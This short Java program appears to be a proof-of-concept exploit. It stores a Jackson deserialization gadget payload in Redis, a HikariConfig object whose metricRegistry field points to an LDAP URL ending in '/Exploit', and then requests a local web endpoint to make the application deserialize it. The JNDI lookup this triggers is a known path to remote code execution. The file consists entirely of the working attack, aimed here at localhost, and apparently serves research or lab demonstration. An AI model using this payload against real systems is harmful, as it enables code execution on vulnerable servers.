package cn.b1ue.redis.unserialize;

import redis.clients.jedis.Jedis;

import java.io.IOException;
import java.net.URL;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2020/4/3 15:33
 */
public class Jackson {

    public static void main(String[] args) throws IOException {

        Jedis jedis = new Jedis("127.0.0.1", 6379);
        jedis.set("blue","[\"com.zaxxer.hikari.HikariConfig\",{\"metricRegistry\":\"ldap://127.0.0.1:1099/Exploit\"}]");
        jedis.close();
        new URL("http://127.0.0.1:8080/home?username=blue").openConnection().connect();

    }

}
